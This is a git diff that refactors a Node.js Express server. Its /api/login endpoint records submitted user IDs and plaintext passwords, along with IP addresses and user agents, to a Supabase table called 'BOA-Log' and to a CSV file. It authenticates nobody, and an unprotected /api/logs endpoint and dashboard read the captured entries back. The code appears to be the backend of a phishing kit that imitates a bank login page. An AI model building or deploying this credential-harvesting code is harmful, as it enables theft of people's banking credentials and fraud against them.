@@ -5,6 +5,7 @@ import { fileURLToPath } from 'url';
 import { createClient } from '@supabase/supabase-js';
 import dotenv from 'dotenv';
 
+// Load environment variables
 dotenv.config();
 
 const __filename = fileURLToPath(import.meta.url);
@@ -12,158 +13,74 @@ const __dirname = path.dirname(__filename);
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const NODE_ENV = process.env.NODE_ENV || 'development';
 
-// Global error handlers
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-});
+console.log(`[Server] Starting in ${NODE_ENV} mode on port ${PORT}`);
 
-process.on('uncaughtException', (error) => {
-  console.error('Uncaught Exception:', error);
-});
+// ============================================================================
+// INITIALIZATION - Order matters!
+// ============================================================================
 
-// Middleware
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// API Routes MUST come before static middleware
-// Setup endpoint to verify and initialize database
-app.post('/api/setup', async (req, res) => {
-  console.log('Setup endpoint called - verifying BOA-Log table');
-  try {
-    if (useSupabase && supabase) {
-      // Test Supabase connection and table
-      const { data, error } = await supabase
-        .from('BOA-Log')
-        .select('*')
-        .limit(1);
-      
-      if (error) {
-        console.error('Supabase table check error:', error.message);
-        return res.json({
-          success: false,
-          message: 'BOA-Log table not accessible',
-          error: error.message,
-          fallback: 'Using CSV logging'
-        });
-      }
-      
-      console.log('Supabase BOA-Log table verified');
-      res.json({
-        success: true,
-        message: 'Supabase BOA-Log table ready',
-        dataSource: 'Supabase + CSV backup'
-      });
-    } else {
-      res.json({
-        success: true,
-        message: 'Using CSV logging (Supabase not configured)',
-        dataSource: 'CSV'
-      });
-    }
-  } catch (error) {
-    console.error('Setup error:', error.message);
-    res.status(500).json({
-      success: false,
-      error: error.message,
-      fallback: 'CSV logging available'
-    });
-  }
-});
-
-// Debug route
-app.get('/api/debug', (req, res) => {
-  res.json({
-    status: 'ok',
-    message: 'Server is running',
-    supabase: supabase ? 'Connected' : 'Not connected',
-    logsDir: logsDir,
-    env: process.env.VERCEL ? 'Vercel' : 'Local'
-  });
-});
-
-// Static file serving middleware - must come before express.static
-app.use((req, res, next) => {
-  // Handle /assets requests explicitly
-  if (req.path.startsWith('/assets/')) {
-    const filepath = path.join(__dirname, req.path);
-    console.log(`[Static] Serving: ${req.path} from ${filepath}`);
-    return res.sendFile(filepath, (err) => {
-      if (err) {
-        console.error(`[Static] Error serving ${req.path}:`, err.message);
-        return next();
-      }
-    });
-  }
-  next();
-});
-
-// Static files middleware - AFTER API routes
-app.use(express.static(path.join(__dirname)));
-
-// Supabase Configuration
+// 1. Initialize Supabase
 const supabaseUrl = process.env.SUPABASE_URL;
 const supabaseKey = process.env.SUPABASE_ANON_KEY;
-const useSupabase = true; // Enabled for BOA-Log table integration
+const useSupabase = !!(supabaseUrl && supabaseKey);
 
 let supabase = null;
 try {
-  if (useSupabase && supabaseUrl && supabaseKey) {
+  if (useSupabase) {
     supabase = createClient(supabaseUrl, supabaseKey);
-    console.log('Supabase client initialized for BOA-Log table');
+    console.log('[Supabase] Client initialized successfully');
   } else {
-    console.log('Supabase credentials not found, will use CSV logging only');
+    console.log('[Supabase] Not configured - using CSV logging only');
   }
 } catch (error) {
-  console.error('Error initializing Supabase:', error.message);
-  supabase = null;
+  console.error('[Supabase] Initialization error:', error.message);
 }
 
-// Local CSV Logger Configuration (uses /tmp on Vercel, ./logs locally)
+// 2. Initialize logs directory
 const logsDir = process.env.VERCEL ? '/tmp' : path.join(__dirname, 'logs');
 try {
   if (!process.env.VERCEL && !fs.existsSync(logsDir)) {
     fs.mkdirSync(logsDir, { recursive: true });
+    console.log(`[Logs] Created directory: ${logsDir}`);
   }
 } catch (error) {
-  console.error('Error creating logs directory:', error.message);
+  console.error('[Logs] Directory creation error:', error.message);
 }
 
-// Helper function to get client IP
+// 3. Global error handlers
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('[Process] Unhandled Rejection:', reason);
+});
+
+process.on('uncaughtException', (error) => {
+  console.error('[Process] Uncaught Exception:', error);
+});
+
+// ============================================================================
+// MIDDLEWARE
+// ============================================================================
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// Request logging middleware
+app.use((req, res, next) => {
+  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
+  next();
+});
+
+// ============================================================================
+// HELPER FUNCTIONS
+// ============================================================================
+
 function getClientIp(req) {
   return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
          req.socket.remoteAddress ||
          'unknown';
 }
 
-// API endpoint for form submissions
-app.post('/api/login', async (req, res) => {
-  console.log('[/api/login] Received request:', req.body);
-  
-  const { userId, password, rememberMe } = req.body;
-  const ipAddress = getClientIp(req);
-  const userAgent = req.headers['user-agent'];
-
-  try {
-    console.log('[/api/login] Calling logEntry...');
-    // Log the entry
-    await logEntry({
-      userId,
-      password,
-      rememberMe: rememberMe === 'on' || rememberMe === true,
-      ipAddress,
-      userAgent
-    });
-
-    console.log('[/api/login] logEntry succeeded');
-    res.json({ success: true, message: 'Login attempt logged' });
-  } catch (error) {
-    console.error('[/api/login] Error processing login:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// Log entry function - supports both Supabase and local CSV
 async function logEntry(data) {
   const timestamp = new Date().toISOString();
   
@@ -186,13 +103,11 @@ async function logEntry(data) {
         
         if (error) {
           console.error('[Supabase] Insert error:', error.message);
-          // Fall through to CSV logging
         } else {
-          console.log('[Supabase] Entry logged to BOA-Log table:', data.userId);
+          console.log('[Supabase] Entry logged successfully for user:', data.userId);
         }
       } catch (supabaseError) {
         console.error('[Supabase] Exception during insert:', supabaseError.message);
-        // Fall through to CSV logging
       }
     }
     
@@ -206,103 +121,227 @@ async function logEntry(data) {
     }
     
     fs.appendFileSync(logsFile, entry);
-    console.log('[CSV] Entry logged:', data.userId);
+    console.log('[CSV] Entry logged for user:', data.userId);
   } catch (error) {
-    console.error('Error logging entry:', error);
+    console.error('[Logs] Error logging entry:', error.message);
     throw error;
   }
 }
 
-// Route to view logs
-app.get('/api/logs', async (req, res) => {
+// ============================================================================
+// API ROUTES
+// ============================================================================
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({
+    status: 'ok',
+    timestamp: new Date().toISOString(),
+    environment: NODE_ENV
+  });
+});
+
+// Setup endpoint to verify database
+app.post('/api/setup', async (req, res) => {
+  console.log('[/api/setup] Verifying database configuration');
   try {
-    // Get logs from local CSV
-    const logsFile = path.join(logsDir, 'login_entries.csv');
-    if (fs.existsSync(logsFile)) {
-      const logs = fs.readFileSync(logsFile, 'utf8');
-      // Parse CSV into JSON with proper handling of quoted fields
-      const lines = logs.split('\n').filter(line => line.trim());
-      const headers = lines[0].split(',').map(h => h.trim());
+    if (useSupabase && supabase) {
+      const { data, error } = await supabase
+        .from('BOA-Log')
+        .select('count(*)', { count: 'exact' })
+        .limit(1);
       
-      const data = lines.slice(1).map(line => {
-        const values = [];
-        let current = '';
-        let inQuotes = false;
-        
-        for (let i = 0; i < line.length; i++) {
-          const char = line[i];
-          const nextChar = line[i + 1];
-          
-          if (char === '"') {
-            inQuotes = !inQuotes;
-          } else if (char === ',' && !inQuotes) {
-            values.push(current.trim().replace(/^"|"$/g, ''));
-            current = '';
-          } else {
-            current += char;
-          }
-        }
-        // Don't forget the last field
-        values.push(current.trim().replace(/^"|"$/g, ''));
-        
-        const obj = {};
-        headers.forEach((header, i) => {
-          obj[header] = values[i] || '';
+      if (error) {
+        console.error('[/api/setup] Supabase table check failed:', error.message);
+        return res.status(500).json({
+          success: false,
+          message: 'BOA-Log table not accessible',
+          error: error.message,
+          fallback: 'CSV logging active'
         });
-        return obj;
-      });
+      }
       
+      console.log('[/api/setup] Supabase table verified');
       res.json({
         success: true,
-        data: data,
-        source: 'Local CSV',
-        total: data.length
+        message: 'Database ready',
+        dataSource: 'Supabase + CSV backup'
       });
     } else {
       res.json({
         success: true,
-        data: [],
-        message: 'No logs found yet',
-        source: 'Local CSV'
+        message: 'Using CSV logging (Supabase not configured)',
+        dataSource: 'CSV'
       });
     }
   } catch (error) {
-    console.error('Error fetching logs:', error);
+    console.error('[/api/setup] Error:', error.message);
+    res.status(500).json({
+      success: false,
+      error: error.message
+    });
+  }
+});
+
+// Debug endpoint
+app.get('/api/debug', (req, res) => {
+  res.json({
+    status: 'ok',
+    timestamp: new Date().toISOString(),
+    environment: NODE_ENV,
+    supabase: useSupabase ? 'Connected' : 'Not configured',
+    logsDir: logsDir,
+    csvLogsPath: path.join(logsDir, 'login_entries.csv'),
+    deployment: process.env.VERCEL ? 'Vercel' : 'Local'
+  });
+});
+
+// Login API endpoint
+app.post('/api/login', async (req, res) => {
+  console.log('[/api/login] Received login request');
+  
+  const { userId, password, rememberMe } = req.body;
+  const ipAddress = getClientIp(req);
+  const userAgent = req.headers['user-agent'];
+
+  try {
+    await logEntry({
+      userId,
+      password,
+      rememberMe: rememberMe === 'on' || rememberMe === true,
+      ipAddress,
+      userAgent
+    });
+
+    console.log('[/api/login] Successfully logged entry');
+    res.json({ success: true, message: 'Login attempt recorded' });
+  } catch (error) {
+    console.error('[/api/login] Error:', error.message);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Serve index.html by default
+// Logs retrieval endpoint
+app.get('/api/logs', async (req, res) => {
+  try {
+    const logsFile = path.join(logsDir, 'login_entries.csv');
+    
+    if (!fs.existsSync(logsFile)) {
+      return res.json({
+        success: true,
+        data: [],
+        message: 'No logs found yet',
+        source: 'CSV'
+      });
+    }
+
+    const logs = fs.readFileSync(logsFile, 'utf8');
+    const lines = logs.split('\n').filter(line => line.trim());
+    const headers = lines[0].split(',').map(h => h.trim());
+    
+    const data = lines.slice(1).map(line => {
+      const values = [];
+      let current = '';
+      let inQuotes = false;
+      
+      for (let i = 0; i < line.length; i++) {
+        const char = line[i];
+        
+        if (char === '"') {
+          inQuotes = !inQuotes;
+        } else if (char === ',' && !inQuotes) {
+          values.push(current.trim().replace(/^"|"$/g, ''));
+          current = '';
+        } else {
+          current += char;
+        }
+      }
+      values.push(current.trim().replace(/^"|"$/g, ''));
+      
+      const obj = {};
+      headers.forEach((header, i) => {
+        obj[header] = values[i] || '';
+      });
+      return obj;
+    });
+    
+    res.json({
+      success: true,
+      data: data,
+      source: 'CSV',
+      total: data.length
+    });
+  } catch (error) {
+    console.error('[/api/logs] Error:', error.message);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// ============================================================================
+// STATIC FILES
+// ============================================================================
+
+// Serve static assets
+app.use(express.static(path.join(__dirname)));
+
+// HTML routes
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Explicit dashboard route
-app.get('/dashboard.html', (req, res) => {
-  res.sendFile(path.join(__dirname, 'dashboard.html'));
-});
-
-// Explicit dashboard route (without extension)
 app.get('/dashboard', (req, res) => {
   res.sendFile(path.join(__dirname, 'dashboard.html'));
 });
 
-// Error handling middleware (must be last)
-app.use((err, req, res, next) => {
-  console.error('[Error]', err);
-  res.status(500).json({ success: false, error: err.message || 'Internal server error' });
+app.get('/dashboard.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dashboard.html'));
 });
 
-// Start server - only on local environment, not on Vercel
-if (!process.env.VERCEL) {
-  app.listen(PORT, () => {
-    console.log(`Server running at http://localhost:${PORT}`);
-    console.log(`CSV logs will be saved to: ${path.join(logsDir, 'login_entries.csv')}`);
-  });
-} else {
-  console.log('Running on Vercel serverless environment');
-  console.log(`CSV logs will be saved to: ${path.join(logsDir, 'login_entries.csv')}`);
-}
+// ============================================================================
+// ERROR HANDLING
+// ============================================================================
 
-// Export for Vercel serverless
+app.use((err, req, res, next) => {
+  console.error('[Error Handler]', err);
+  res.status(500).json({
+    success: false,
+    error: NODE_ENV === 'production' ? 'Internal server error' : err.message
+  });
+});
+
+app.use((req, res) => {
+  res.status(404).json({
+    success: false,
+    error: 'Route not found'
+  });
+});
+
+// ============================================================================
+// SERVER STARTUP
+// ============================================================================
+
+const server = app.listen(PORT, '0.0.0.0', () => {
+  console.log(`[Server] Listening on port ${PORT}`);
+  console.log(`[Server] Environment: ${NODE_ENV}`);
+  console.log(`[Server] Supabase: ${useSupabase ? 'Enabled' : 'Disabled'}`);
+  console.log(`[Server] Local: http://localhost:${PORT}`);
+});
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('[Server] SIGTERM received, shutting down gracefully');
+  server.close(() => {
+    console.log('[Server] Server closed');
+    process.exit(0);
+  });
+});
+
+process.on('SIGINT', () => {
+  console.log('[Server] SIGINT received, shutting down gracefully');
+  server.close(() => {
+    console.log('[Server] Server closed');
+    process.exit(0);
+  });
+});
+
 export default app;
